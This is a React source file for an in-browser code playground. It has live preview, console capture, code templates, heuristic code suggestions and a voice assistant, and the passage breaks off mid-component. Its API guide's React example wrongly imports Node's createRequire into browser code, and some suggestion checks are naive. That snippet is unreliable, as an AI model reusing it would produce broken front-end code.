// App.js
import React, { useState, useEffect, useRef } from 'react';
import {
  Container,
  Row,
  Col,
  Tab,
  Nav,
  Button,
  Form,
  Card,
  Alert,
  Navbar,
  OverlayTrigger,
  Tooltip,
  Dropdown,
  Modal,
  ListGroup,
  Badge,
  InputGroup,
  FormControl
} from 'react-bootstrap';
import './App.css';

// Template snippets for different coding patterns
const codeTemplates = {
  react: {
    'Functional Component': `import React from 'react';

const ComponentName = ({ prop1, prop2 }) => {
  return (
    <div>
      <h1>{prop1}</h1>
      <p>{prop2}</p>
    </div>
  );
};

export default ComponentName;`,
    'useState Hook': `import React, { useState } from 'react';

const ComponentWithState = () => {
  const [count, setCount] = useState(0);
  
  return (
    <div>
      <p>You clicked {count} times</p>
      <button onClick={() => setCount(count + 1)}>
        Click me
      </button>
    </div>
  );
};`,
    'useEffect Hook': `import React, { useState, useEffect } from 'react';

const ComponentWithEffect = () => {
  const [data, setData] = useState(null);
  
  useEffect(() => {
    // This runs after component mounts and when dependencies change
    const fetchData = async () => {
      try {
        const response = await fetch('https://api.example.com/data');
        const result = await response.json();
        setData(result);
      } catch (error) {
        console.error('Error fetching data:', error);
      }
    };
    
    fetchData();
    
    // Clean up function (runs before unmount)
    return () => {
      console.log('Component will unmount');
    };
  }, []); // Empty dependency array means run once after mount
  
  return (
    <div>
      {data ? (
        <p>Data loaded: {JSON.stringify(data)}</p>
      ) : (
        <p>Loading data...</p>
      )}
    </div>
  );
};`
  },
  api: {
    'Fetch API': `// Basic Fetch API call
const fetchData = async (url) => {
  try {
    const response = await fetch(url);
    
    // Check if the response is ok (status 200-299)
    if (!response.ok) {
      throw new Error(\`HTTP error! Status: \${response.status}\`);
    }
    
    const data = await response.json();
    return data;
  } catch (error) {
    console.error('Error fetching data:', error);
    throw error;
  }
};

// Usage
fetchData('https://api.example.com/data')
  .then(data => console.log(data))
  .catch(error => console.error(error));`,
    'Axios GET': `// Install axios: npm install axios
import axios from 'axios';

const fetchWithAxios = async (url) => {
  try {
    const response = await axios.get(url);
    // Axios automatically throws for error status codes
    return response.data;
  } catch (error) {
    if (error.response) {
      // The request was made and the server responded with a status code
      // that falls out of the range of 2xx
      console.error('Error data:', error.response.data);
      console.error('Error status:', error.response.status);
    } else if (error.request) {
      // The request was made but no response was received
      console.error('Error request:', error.request);
    } else {
      // Something happened in setting up the request
      console.error('Error message:', error.message);
    }
    throw error;
  }
};`,
    'POST Request': `// POST with Fetch API
const postData = async (url, data) => {
  try {
    const response = await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(data)
    });
    
    if (!response.ok) {
      throw new Error(\`HTTP error! Status: \${response.status}\`);
    }
    
    return await response.json();
  } catch (error) {
    console.error('Error posting data:', error);
    throw error;
  }
};

// Usage
const dataToSend = { name: 'John', age: 30 };
postData('https://api.example.com/users', dataToSend)
  .then(response => console.log('Success:', response))
  .catch(error => console.error('Error:', error));`
  },
  database: {
    'Firebase Setup': `// Install Firebase: npm install firebase
import { initializeApp } from 'firebase/app';
import { getFirestore, collection, getDocs, addDoc } from 'firebase/firestore';

// Firebase configuration
const firebaseConfig = {
  apiKey: "YOUR_API_KEY",
  authDomain: "YOUR_PROJECT_ID.firebaseapp.com",
  projectId: "YOUR_PROJECT_ID",
  storageBucket: "YOUR_PROJECT_ID.appspot.com",
  messagingSenderId: "YOUR_MESSAGING_SENDER_ID",
  appId: "YOUR_APP_ID"
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

// Fetch documents from a collection
const fetchDocuments = async (collectionName) => {
  try {
    const querySnapshot = await getDocs(collection(db, collectionName));
    const documents = [];
    
    querySnapshot.forEach((doc) => {
      documents.push({
        id: doc.id,
        ...doc.data()
      });
    });
    
    return documents;
  } catch (error) {
    console.error('Error fetching documents:', error);
    throw error;
  }
};

// Add a document to a collection
const addDocument = async (collectionName, data) => {
  try {
    const docRef = await addDoc(collection(db, collectionName), data);
    console.log('Document written with ID:', docRef.id);
    return docRef.id;
  } catch (error) {
    console.error('Error adding document:', error);
    throw error;
  }
};`,
    'MongoDB (Node.js)': `// For server-side Node.js with MongoDB
// Install: npm install mongodb
const { MongoClient } = require('mongodb');

// Connection URL
const url = 'mongodb://localhost:27017';
const client = new MongoClient(url);

// Database Name
const dbName = 'myDatabase';

// Connect to the database
async function connectToDatabase() {
  try {
    await client.connect();
    console.log('Connected to MongoDB');
    const db = client.db(dbName);
    return db;
  } catch (error) {
    console.error('Error connecting to MongoDB:', error);
    throw error;
  }
}

// Fetch documents from a collection
async function findDocuments(collectionName, query = {}) {
  try {
    const db = await connectToDatabase();
    const collection = db.collection(collectionName);
    const documents = await collection.find(query).toArray();
    return documents;
  } catch (error) {
    console.error('Error finding documents:', error);
    throw error;
  } finally {
    await client.close();
  }
}

// Insert a document into a collection
async function insertDocument(collectionName, document) {
  try {
    const db = await connectToDatabase();
    const collection = db.collection(collectionName);
    const result = await collection.insertOne(document);
    return result;
  } catch (error) {
    console.error('Error inserting document:', error);
    throw error;
  } finally {
    await client.close();
  }
}`,
    'Mongoose Schema': `// For Node.js with Mongoose ORM
// Install: npm install mongoose
const mongoose = require('mongoose');

// Connect to MongoDB
mongoose.connect('mongodb://localhost:27017/myDatabase', {
  useNewUrlParser: true,
  useUnifiedTopology: true
})
.then(() => console.log('Connected to MongoDB'))
.catch(err => console.error('Could not connect to MongoDB', err));

// Define a schema
const userSchema = new mongoose.Schema({
  name: { 
    type: String, 
    required: true,
    minlength: 3,
    maxlength: 50
  },
  email: {
    type: String,
    required: true,
    unique: true
  },
  password: {
    type: String,
    required: true,
    minlength: 6
  },
  isAdmin: Boolean,
  createdAt: {
    type: Date,
    default: Date.now
  }
});

// Create a model
const User = mongoose.model('User', userSchema);

// Create a new user
async function createUser(userData) {
  try {
    const user = new User(userData);
    const result = await user.save();
    return result;
  } catch (error) {
    console.error('Error creating user:', error);
    throw error;
  }
}

// Get all users
async function getUsers() {
  try {
    const users = await User.find().sort('name');
    return users;
  } catch (error) {
    console.error('Error getting users:', error);
    throw error;
  }
}`
  }
};

function App() {
  // Code editors content
  const [htmlCode, setHtmlCode] = useState(
    `<!DOCTYPE html>
<html>
<head>
  <title>My Page</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body>
  <h1>Hello World!</h1>
  <p>Welcome to my interactive page.</p>
  <button id="myButton">Click me!</button>
</body>
</html>`
  );

  const [cssCode, setCssCode] = useState(
    `body {
  font-family: Arial, sans-serif;
  max-width: 800px;
  margin: 0 auto;
  padding: 20px;
}

h1 {
  color: #0078d4;
}

button {
  background-color: #0078d4;
  color: white;
  border: none;
  padding: 10px 15px;
  border-radius: 4px;
  cursor: pointer;
}

button:hover {
  background-color: #106ebe;
}`
  );

  const [jsCode, setJsCode] = useState(
    `// Add your JavaScript code here
document.getElementById('myButton').addEventListener('click', function() {
  alert('Button clicked!');
  console.log('Button was clicked at: ' + new Date().toLocaleTimeString());
});`
  );

  const [reactCode, setReactCode] = useState(
    `import React, { useState } from 'react';
import ReactDOM from 'react-dom';

function App() {
  const [message, setMessage] = useState('Hello from React!');
  
  return (
    <div className="app">
      <h1>{message}</h1>
      <button 
        onClick={() => setMessage('Button was clicked!')}
      >
        Click me
      </button>
    </div>
  );
}

ReactDOM.render(<App />, document.getElementById('root'));`
  );

  // Additional state for new features
  const [currentTab, setCurrentTab] = useState('html');
  const [showTemplateModal, setShowTemplateModal] = useState(false);
  const [selectedTemplateCategory, setSelectedTemplateCategory] = useState('react');
  const [fullScreen, setFullScreen] = useState(false);
  const [darkMode, setDarkMode] = useState(true);
  const [showAPIDocs, setShowAPIDocs] = useState(false);
  
  // Voice related
  const [isSpeaking, setIsSpeaking] = useState(false);
  const [speechSynthesis, setSpeechSynthesis] = useState(null);
  const [voiceEnabled, setVoiceEnabled] = useState(true);
  const [voiceStatus, setVoiceStatus] = useState('initializing');
  const [availableVoices, setAvailableVoices] = useState([]);
  const [selectedVoice, setSelectedVoice] = useState(null);
  
  // Console & preview
  const [consoleMessages, setConsoleMessages] = useState([
    { type: 'info', message: 'Console ready. Run your code to see output here.' }
  ]);
  const [suggestions, setSuggestions] = useState([]);
  const previewRef = useRef(null);

  // Speech synthesis setup
  useEffect(() => {
    if (typeof window !== 'undefined' && window.speechSynthesis) {
      setSpeechSynthesis(window.speechSynthesis);
      setVoiceStatus('loading');
      
      // Load available voices
      const loadVoices = () => {
        const voices = window.speechSynthesis.getVoices();
        if (voices.length > 0) {
          setAvailableVoices(voices);
          
          // Find a suitable default voice
          const preferredVoice = voices.find(voice => 
            voice.name.includes('Google') || voice.name.includes('Natural') || 
            voice.name.includes('Samantha') || voice.name.includes('Daniel')
          ) || voices[0];
          
          setSelectedVoice(preferredVoice);
          setVoiceStatus('ready');
        } else {
          setVoiceStatus('unavailable');
        }
      };
      
      // Chrome loads voices asynchronously
      if (window.speechSynthesis.onvoiceschanged !== undefined) {
        window.speechSynthesis.onvoiceschanged = loadVoices;
      }
      
      // For browsers that load voices immediately
      loadVoices();
      
      // Test speech synthesis with a silent utterance to ensure browser allows it
      try {
        const testUtterance = new SpeechSynthesisUtterance('');
        testUtterance.volume = 0; // Silent test
        testUtterance.onend = () => {
          setVoiceStatus('ready');
        };
        testUtterance.onerror = () => {
          setVoiceStatus('error');
        };
        window.speechSynthesis.speak(testUtterance);
      } catch (e) {
        console.error("Speech synthesis test failed:", e);
        setVoiceStatus('error');
      }
      
      return () => {
        if (window.speechSynthesis) {
          window.speechSynthesis.cancel();
          if (window.speechSynthesis.onvoiceschanged !== undefined) {
            window.speechSynthesis.onvoiceschanged = null;
          }
        }
      };
    } else {
      setVoiceStatus('unsupported');
    }
  }, []);

  // Speak text using the browser's speech synthesis
  const speak = (text) => {
    if (speechSynthesis && voiceEnabled && voiceStatus === 'ready') {
      // Cancel any ongoing speech
      speechSynthesis.cancel();
      
      const utterance = new SpeechSynthesisUtterance(text);
      
      if (selectedVoice) {
        utterance.voice = selectedVoice;
      }
      
      utterance.rate = 1;
      utterance.pitch = 1;
      utterance.volume = 1;
      
      utterance.onstart = () => setIsSpeaking(true);
      utterance.onend = () => setIsSpeaking(false);
      utterance.onerror = (e) => {
        console.error("Speech synthesis error:", e);
        setIsSpeaking(false);
        setVoiceStatus('error');
      };
      
      speechSynthesis.speak(utterance);
    } else if (voiceStatus !== 'ready') {
      console.warn(`Voice not ready. Current status: ${voiceStatus}`);
      addConsoleMessage('warn', `Voice assistance not available. Status: ${voiceStatus}`);
    }
  };

  // Change selected voice
  const changeVoice = (voice) => {
    setSelectedVoice(voice);
    
    // Test the new voice with a welcome message
    if (speechSynthesis && voiceEnabled) {
      const utterance = new SpeechSynthesisUtterance("Voice changed successfully.");
      utterance.voice = voice;
      speechSynthesis.cancel(); // Cancel any ongoing speech
      
      utterance.onstart = () => setIsSpeaking(true);
      utterance.onend = () => setIsSpeaking(false);
      
      speechSynthesis.speak(utterance);
    }
  };

  // Run code function
  const runCode = () => {
    try {
      // Clear previous console messages except the first info message
      setConsoleMessages([{ type: 'info', message: 'Code executed at: ' + new Date().toLocaleTimeString() }]);
      
      if (previewRef.current) {
        const frameDoc = previewRef.current.contentDocument || previewRef.current.contentWindow.document;
        frameDoc.open();
        
        // Prepare content based on the current tab
        let content = '';
        
        if (currentTab === 'react') {
          // For React, include React and ReactDOM libraries
          content = `
            <!DOCTYPE html>
            <html>
            <head>
              <meta charset="UTF-8">
              <meta name="viewport" content="width=device-width, initial-scale=1.0">
              <title>React Preview</title>
              <style>${cssCode}</style>
              <script src="https://unpkg.com/react@17/umd/react.development.js"></script>
              <script src="https://unpkg.com/react-dom@17/umd/react-dom.development.js"></script>
              <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
            </head>
            <body>
              <div id="root"></div>
              <script type="text/babel">${reactCode}</script>
            </body>
            </html>
          `;
        } else {
          // For HTML/CSS/JS, use the standard approach
          content = `
            ${htmlCode}
            <style>${cssCode}</style>
            <script>
              // Capture console output
              const originalConsole = console;
              console = {
                log: function(message) {
                  originalConsole.log(message);
                  window.parent.postMessage({
                    type: 'console',
                    method: 'log',
                    message: message
                  }, '*');
                },
                error: function(message) {
                  originalConsole.error(message);
                  window.parent.postMessage({
                    type: 'console',
                    method: 'error',
                    message: message
                  }, '*');
                },
                warn: function(message) {
                  originalConsole.warn(message);
                  window.parent.postMessage({
                    type: 'console',
                    method: 'warn',
                    message: message
                  }, '*');
                }
              };
              
              // Capture errors
              window.onerror = function(message, source, lineno, colno, error) {
                window.parent.postMessage({
                  type: 'console',
                  method: 'error',
                  message: message + ' at line ' + lineno + ':' + colno
                }, '*');
                return true;
              };
            </script>
            <script>${jsCode}</script>
          `;
        }
        
        frameDoc.write(content);
        frameDoc.close();
      }
    } catch (error) {
      addConsoleMessage('error', `Error running code: ${error.message}`);
    }
  };

  // Listen for messages from the iframe
  useEffect(() => {
    const handleMessage = (event) => {
      if (event.data && event.data.type === 'console') {
        addConsoleMessage(event.data.method, event.data.message);
      }
    };
    
    window.addEventListener('message', handleMessage);
    return () => window.removeEventListener('message', handleMessage);
  }, []); // Removed consoleMessages dependency

  // Add message to console
  const addConsoleMessage = (type, message) => {
    setConsoleMessages(prev => [...prev, { type, message: formatConsoleMessage(message) }]);
  };

  // Format console message for display
  const formatConsoleMessage = (message) => {
    if (typeof message === 'object') {
      try {
        return JSON.stringify(message, null, 2);
      } catch {
        return String(message);
      }
    }
    return String(message);
  };

  // Analyze code and provide suggestions
  const analyzeCode = () => {
    const newSuggestions = [];
    let voiceMessage = "I've analyzed your code. ";
    
    // Different analysis based on current tab
    if (currentTab === 'html' || currentTab === 'css' || currentTab === 'js') {
      // Analyze HTML
      if (currentTab === 'html') {
        if (!htmlCode.includes('<!DOCTYPE html>')) {
          newSuggestions.push({
            title: 'Missing DOCTYPE',
            description: 'Add <!DOCTYPE html> to ensure proper rendering mode',
            codeExample: '<!DOCTYPE html>\n<html>\n...'
          });
          voiceMessage += "You're missing a DOCTYPE declaration. ";
        }
        
        if (!htmlCode.includes('<meta name="viewport"')) {
          newSuggestions.push({
            title: 'Missing Viewport Meta Tag',
            description: 'Add <meta name="viewport" content="width=device-width, initial-scale=1.0"> for responsive design',
            codeExample: '<head>\n  <meta name="viewport" content="width=device-width, initial-scale=1.0">\n  ...\n</head>'
          });
          voiceMessage += "You should add a viewport meta tag for responsive design. ";
        }
      }
      
      // Analyze CSS
      if (currentTab === 'css') {
        if (cssCode.includes('!important')) {
          newSuggestions.push({
            title: 'Avoid !important',
            description: 'Using !important can lead to specificity issues. Consider restructuring your CSS selectors',
            codeExample: '/* Instead of */\n.element {\n  color: red !important;\n}\n\n/* Try using more specific selectors */\nbody .parent .element {\n  color: red;\n}'
          });
          voiceMessage += "Try to avoid using !important in your CSS. ";
        }
        
        if (!cssCode.includes('@media')) {
          newSuggestions.push({
            title: 'Consider Media Queries',
            description: 'Add media queries for responsive design across different screen sizes',
            codeExample: '@media (max-width: 768px) {\n  /* Styles for tablets and smaller screens */\n  .container {\n    width: 100%;\n    padding: 10px;\n  }\n}'
          });
          voiceMessage += "Consider adding media queries for better responsiveness. ";
        }
      }
      
      // Analyze JS
      if (currentTab === 'js') {
        if (jsCode.includes('var ')) {
          newSuggestions.push({
            title: 'Modern JavaScript',
            description: 'Consider using let or const instead of var for better scoping',
            codeExample: '// Instead of\nvar x = 10;\n\n// Use\nconst x = 10; // for constants\nlet y = 20; // for variables that change'
          });
          voiceMessage += "I recommend using let or const instead of var in your JavaScript. ";
        }
        
        if (jsCode.includes('function(') && !jsCode.includes('=>')) {
          newSuggestions.push({
            title: 'Arrow Functions',
            description: 'Consider using arrow functions for cleaner syntax',
            codeExample: '// Instead of\ndocument.getElementById("myButton").addEventListener("click", function() {\n  console.log("Clicked");\n});\n\n// Use\ndocument.getElementById("myButton").addEventListener("click", () => {\n  console.log("Clicked");\n});'
          });
          voiceMessage += "You could use arrow functions for cleaner syntax. ";
        }
        
        // Check for direct element manipulation vs modern approaches
        if (jsCode.includes('document.getElementById') && !jsCode.includes('querySelector')) {
          newSuggestions.push({
            title: 'Modern DOM Selection',
            description: 'Consider using querySelector/querySelectorAll for more flexible DOM selection',
            codeExample: '// Instead of\nconst element = document.getElementById("myButton");\n\n// Use\nconst element = document.querySelector("#myButton");\nconst allButtons = document.querySelectorAll("button");'
          });
          voiceMessage += "You can use querySelector instead of getElementById for more flexible DOM selection. ";
        }
      }
    } else if (currentTab === 'react') {
      // Analyze React code
      if (!reactCode.includes('import React')) {
        newSuggestions.push({
          title: 'Missing React Import',
          description: 'You need to import React when using JSX',
          codeExample: 'import React from "react";'
        });
        voiceMessage += "You need to import React when using JSX. ";
      }
      
      if (reactCode.includes('class ') && reactCode.includes('extends React.Component')) {
        newSuggestions.push({
          title: 'Consider Functional Components',
          description: 'Modern React favors functional components with hooks over class components',
          codeExample: '// Instead of class components:\nclass MyComponent extends React.Component {\n  render() {\n    return <div>{this.props.name}</div>;\n  }\n}\n\n// Use functional components:\nconst MyComponent = ({ name }) => {\n  return <div>{name}</div>;\n};'
        });
        voiceMessage += "Consider using functional components with hooks instead of class components. ";
      }
      
      if (reactCode.includes('componentDidMount') || reactCode.includes('componentDidUpdate')) {
        newSuggestions.push({
          title: 'Use Effect Hook',
          description: 'Replace lifecycle methods with the useEffect hook',
          codeExample: '// Instead of:\ncomponentDidMount() {\n  fetchData();\n}\n\n// Use:\nimport React, { useEffect } from "react";\n\nconst MyComponent = () => {\n  useEffect(() => {\n    fetchData();\n  }, []); // Empty dependency array = componentDidMount\n\n  return <div>...</div>;\n};'
        });
        voiceMessage += "Consider using the useEffect hook instead of lifecycle methods. ";
      }
    }
    
    // Add API integration suggestions
    if (jsCode.includes('fetch(') || reactCode.includes('fetch(') || jsCode.includes('axios') || reactCode.includes('axios')) {
      newSuggestions.push({
        title: 'API Error Handling',
        description: 'Ensure you have proper error handling for API calls',
        codeExample: 'try {\n  const response = await fetch(url);\n  if (!response.ok) {\n    throw new Error(`HTTP error! Status: ${response.status}`);\n  }\n  const data = await response.json();\n  // Process data\n} catch (error) {\n  console.error("Error fetching data:", error);\n  // Handle error (show user-friendly message, retry, etc.)\n}'
      });
      voiceMessage += "Make sure you have proper error handling for your API calls. ";
    }
    
    // Logic suggestions
    newSuggestions.push({
      title: 'Build Logic More Concisely',
      description: 'Consider breaking down complex logic into smaller, reusable functions',
      codeExample: '// Instead of repeating logic\nfunction processData() {\n  // complex logic here\n}\n\n// Create helper functions\nfunction validateInput(data) { return isValid; }\nfunction transformData(data) { return transformed; }\nfunction displayResult(result) { /* display code */ }\n\nfunction processData() {\n  if (!validateInput(data)) return;\n  const result = transformData(data);\n  displayResult(result);\n}'
    });
    voiceMessage += "Remember to break down complex logic into smaller, reusable functions. ";
    
    // If no suggestions found (excluding the logic suggestion which is always added)
    if (newSuggestions.length === 1) {
      newSuggestions.unshift({
        title: 'Code Looks Good!',
        description: 'No major issues were found in your code. Good job!',
        codeExample: null
      });
      voiceMessage = "Your code looks good! I don't see any major issues.";
    }
    
    setSuggestions(newSuggestions);
    speak(voiceMessage);
  };

  // Run code on component mount
  useEffect(() => {
    // Wait a bit for the iframe to be fully initialized
    const timer = setTimeout(() => {
      runCode();
    }, 1000);
    
    return () => clearTimeout(timer);
  }, []); // Run only once on component mount

  // Clear console messages
  const clearConsole = () => {
    setConsoleMessages([{ type: 'info', message: 'Console cleared' }]);
  };

  // Toggle voice assistance
  const toggleVoice = () => {
    if (voiceStatus === 'unsupported' || voiceStatus === 'error') {
      addConsoleMessage('error', 'Voice assistance is not available in your browser');
      return;
    }
    
    setVoiceEnabled(prev => !prev);
    
    if (speechSynthesis) {
      if (voiceEnabled) {
        speechSynthesis.cancel(); // Stop current speech if turning off
      } else if (voiceStatus === 'ready') {
        speak("Voice assistance is now enabled. I'll provide audio feedback on your code.");
      }
    }
  };

  // Get help with current issue
  const getHelp = () => {
    // Analyze current code and identify likely issues
    analyzeCode();
    
    // Additional voice guidance based on code patterns and current tab
    let helpMessage = "I notice you might be having some issues. ";
    
    if (currentTab === 'js') {
      // Check for common errors in JS
      if (jsCode.includes('document.getElementByID')) {
        helpMessage += "I noticed you're using 'document.getElementByID' but the correct method is 'document.getElementById' with a lowercase 'd'. ";
      }
      
      if (jsCode.includes('.innerHtml')) {
        helpMessage += "You're using '.innerHtml' but the correct property is '.innerHTML' with uppercase 'HTML'. ";
      }
      
      // Look for mismatched brackets/parentheses
      const openBrackets = (jsCode.match(/\{/g) || []).length;
      const closeBrackets = (jsCode.match(/\}/g) || []).length;
      if (openBrackets !== closeBrackets) {
        helpMessage += "You have mismatched curly braces in your JavaScript code. Check that each opening brace has a matching closing brace. ";
      }
      
      // Look for missing semicolons
      if (jsCode.split('\n').some(line => {
        const trimmedLine = line.trim();
        return trimmedLine.length > 0 &&
          !trimmedLine.startsWith('//') &&
          !trimmedLine.endsWith(';') &&
          !trimmedLine.endsWith('{') &&
          !trimmedLine.endsWith('}') &&
          !trimmedLine.includes('function') &&
          /\b(let|const|var)\s+\w+\s*=\s*[^;]+$/.test(trimmedLine);
      })) {
        helpMessage += "Some of your JavaScript statements may be missing semicolons at the end. ";
      }
    } else if (currentTab === 'react') {
      // React specific help
      if (reactCode.includes('class') && !reactCode.includes('extends React.Component') && !reactCode.includes('extends Component')) {
        helpMessage += "Your React class component should extend React.Component or Component. ";
      }
      
      if (!reactCode.includes('export default') && !reactCode.includes('export {')) {
        helpMessage += "Don't forget to export your component so it can be imported elsewhere. ";
      }
      
      if (reactCode.includes('useState') && !reactCode.includes('import { useState }')) {
        helpMessage += "You're using the useState hook but haven't imported it. Add 'import { useState } from \"react\"'. ";
      }
    }
    
    speak(helpMessage + "Let me know if you need specific help with any part of your code.");
  };

  // Insert template code
  const insertTemplate = (templateCode) => {
    switch (currentTab) {
      case 'html':
        setHtmlCode(templateCode);
        break;
      case 'css':
        setCssCode(templateCode);
        break;
      case 'js':
        setJsCode(templateCode);
        break;
      case 'react':
        setReactCode(templateCode);
        break;
      default:
        break;
    }
    
    setShowTemplateModal(false);
    speak("Template code has been inserted. You can now customize it to fit your needs.");
  };

  // Handle tab change
  const handleTabChange = (tab) => {
    setCurrentTab(tab);
    
    // Run the code with a small delay to update the preview
    setTimeout(() => {
      runCode();
    }, 100);
  };

  // Toggle full screen mode
  const toggleFullScreen = () => {
    setFullScreen(!fullScreen);
  };

  // Toggle dark/light mode
  const toggleDarkMode = () => {
    setDarkMode(!darkMode);
    document.body.classList.toggle('light-mode');
  };

  // Component for rendering console messages with appropriate styling
  const ConsoleMessage = ({ message }) => {
    let icon = '📄';
    let className = 'console-log';
    
    if (message.type === 'error') {
      icon = '❌';
      className = 'console-error';
    } else if (message.type === 'warn') {
      icon = '⚠️';
      className = 'console-warn';
    } else if (message.type === 'info') {
      icon = 'ℹ️';
      className = 'console-info';
    }
    
    return (
      <div className={`console-message ${className}`}>
        <span className="console-icon">{icon}</span>
        <span className="console-text">{message.message}</span>
      </div>
    );
  };

  // Component for rendering suggestions with code examples
  const SuggestionItem = ({ suggestion }) => (
    <Card className="mb-3">
      <Card.Header as="h5" className="suggestion-title">{suggestion.title}</Card.Header>
      <Card.Body>
        <Card.Text>{suggestion.description}</Card.Text>
        {suggestion.codeExample && (
          <div className="code-example">
            <pre><code>{suggestion.codeExample}</code></pre>
            <Button 
              variant="outline-primary" 
              size="sm" 
              className="mt-2"
              onClick={() => {
                navigator.clipboard.writeText(suggestion.codeExample);
                addConsoleMessage('info', 'Code example copied to clipboard');
              }}
            >
              Copy to Clipboard
            </Button>
          </div>
        )}
      </Card.Body>
    </Card>
  );

  // Template Modal Component
  const TemplateModal = () => (
    <Modal
      show={showTemplateModal}
      onHide={() => setShowTemplateModal(false)}
      size="lg"
      centered
      className={darkMode ? 'dark-modal' : ''}
    >
      <Modal.Header closeButton>
        <Modal.Title>Code Templates</Modal.Title>
      </Modal.Header>
      <Modal.Body>
        <Nav variant="tabs" className="mb-3">
          <Nav.Item>
            <Nav.Link 
              active={selectedTemplateCategory === 'react'} 
              onClick={() => setSelectedTemplateCategory('react')}
            >
              React
            </Nav.Link>
          </Nav.Item>
          <Nav.Item>
            <Nav.Link 
              active={selectedTemplateCategory === 'api'} 
              onClick={() => setSelectedTemplateCategory('api')}
            >
              API Integration
            </Nav.Link>
          </Nav.Item>
          <Nav.Item>
            <Nav.Link 
              active={selectedTemplateCategory === 'database'} 
              onClick={() => setSelectedTemplateCategory('database')}
            >
              Database
            </Nav.Link>
          </Nav.Item>
        </Nav>
        
        <div className="template-list">
          {Object.entries(codeTemplates[selectedTemplateCategory]).map(([name, code]) => (
            <Card key={name} className="mb-3">
              <Card.Header>{name}</Card.Header>
              <Card.Body>
                <pre className="template-code-preview">
                  <code>{code.length > 300 ? code.substring(0, 300) + '...' : code}</code>
                </pre>
                <Button 
                  variant="primary" 
                  onClick={() => insertTemplate(code)}
                >
                  Insert Template
                </Button>
              </Card.Body>
            </Card>
          ))}
        </div>
      </Modal.Body>
    </Modal>
  );

  // API Documentation Modal
  const APIDocsModal = () => (
    <Modal
      show={showAPIDocs}
      onHide={() => setShowAPIDocs(false)}
      size="lg"
      centered
      className={darkMode ? 'dark-modal' : ''}
    >
      <Modal.Header closeButton>
        <Modal.Title>API Integration Guide</Modal.Title>
      </Modal.Header>
      <Modal.Body>
        <h5>Basic API Request Pattern</h5>
        <pre>
          <code>{`
// Using async/await with fetch
async function fetchData(url) {
  try {
    const response = await fetch(url);
    
    if (!response.ok) {
      throw new Error(\`HTTP error! Status: \${response.status}\`);
    }
    
    const data = await response.json();
    return data;
  } catch (error) {
    console.error('Error fetching data:', error);
    // Handle error appropriately
    throw error;
  }
}
          `}</code>
        </pre>
        
        <h5>API Integration in React</h5>
        <pre>
          <code>{`
import React, { useState, useEffect } from 'react';
import { createRequire } from 'module';

const require = createRequire(import.meta.url);

function DataComponent() {
  const [data, setData] = useState(null);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState(null);
  
  useEffect(() => {
    const fetchData = async () => {
      try {
        const response = await fetch('https://api.example.com/data');
        
        if (!response.ok) {
          throw new Error(\`HTTP error! Status: \${response.status}\`);
        }
        
        const result = await response.json();
        setData(result);
        setLoading(false);
      } catch (error) {
        console.error('Error fetching data:', error);
        setError(error.message);
        setLoading(false);
      }
    };
    
    fetchData();
    
    // Optional cleanup function
    return () => {
      // Cancel any pending requests if component unmounts
    };
  }, []); // Empty dependency array means run once after mount
  
  if (loading) return <div>Loading...</div>;
  if (error) return <div>Error: {error}</div>;
  
  return (
    <div>
      <h2>Data from API</h2>
      <pre>{JSON.stringify(data, null, 2)}</pre>
    </div>
  );
}
          `}</code>
        </pre>
        
        <h5>Authentication Patterns</h5>
        <pre>
          <code>{`
// JWT Authentication
const login = async (credentials) => {
  try {
    const response = await fetch('https://api.example.com/login', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(credentials)
    });
    
    if (!response.ok) {
      throw new Error(\`HTTP error! Status: \${response.status}\`);
    }
    
    const { token } = await response.json();
    
    // Store token securely (localStorage for simplicity, but consider more secure options)
    localStorage.setItem('token', token);
    
    return true;
  } catch (error) {
    console.error('Login error:', error);
    return false;
  }
};

// Making authenticated requests
const fetchProtectedData = async () => {
  const token = localStorage.getItem('token');
  
  if (!token) {
    // Redirect to login or handle unauthenticated state
    return null;
  }
  
  try {
    const response = await fetch('https://api.example.com/protected-data', {
      headers: {
        'Authorization': \`Bearer \${token}\`
      }
    });
    
    if (response.status === 401) {
      // Token expired or invalid, handle accordingly
      localStorage.removeItem('token');
      // Redirect to login
      return null;
    }
    
    if (!response.ok) {
      throw new Error(\`HTTP error! Status: \${response.status}\`);
    }
    
    return await response.json();
  } catch (error) {
    console.error('Error fetching protected data:', error);
    return null;
  }
};
          `}</code>
        </pre>
      </Modal.Body>
    </Modal>
  );

  // Voice Options Modal
  const [showVoiceModal, setShowVoiceModal] = useState(false);
  const VoiceOptionsModal = () => (
    <Modal
      show={showVoiceModal}
      onHide={() => setShowVoiceModal(false)}
      centered
      className={darkMode ? 'dark-modal' : ''}
    >
      <Modal.Header closeButton>
        <Modal.Title>Voice Assistant Options</Modal.Title>
      </Modal.Header>
      <Modal.Body>
        <p>Current status: {voiceStatus}</p>
        
        {voiceStatus === 'unsupported' && (
          <Alert variant="warning">
            Your browser does not support speech synthesis. Try using a modern browser like Chrome, Edge, or Safari.
          </Alert>
        )}
        
        {voiceStatus === 'error' && (
          <Alert variant="danger">
            There was an error initializing the speech synthesis. This might happen if your browser requires user interaction before allowing speech.
            <br /><br />
            <Button 
              variant="outline-primary" 
              onClick={() => {
                // Try to reinitialize speech synthesis after user interaction
                if (speechSynthesis) {
                  const testUtterance = new SpeechSynthesisUtterance("Voice test");
                  testUtterance.onend = () => {
                    setVoiceStatus('ready');
                    speak("Voice assistant is now ready to use.");
                  };
                  testUtterance.onerror = () => {
                    setVoiceStatus('error');
                  };
                  speechSynthesis.speak(testUtterance);
                }
              }}
            >
              Test Voice Again
            </Button>
          </Alert>
        )}
        
        {voiceStatus === 'ready' && availableVoices.length > 0 && (
          <>
            <Form.Group className="mb-3">
              <Form.Label>Select Voice</Form.Label>
              <Form.Select 
                value={selectedVoice ? availableVoices.findIndex(v => v.name === selectedVoice.name) : 0}
                onChange={(e) => changeVoice(availableVoices[e.target.value])}
              >
                {availableVoices.map((voice, index) => (
                  <option key={voice.name} value={index}>
                    {voice.name} ({voice.lang})
                  </option>
                ))}
              </Form.Select>
            </Form.Group>
            
            <Button 
              variant="primary" 
              onClick={() => {
                speak("This is a test of the voice assistant. I can analyze your code and provide helpful suggestions.");
              }}
            >
              Test Selected Voice
            </Button>
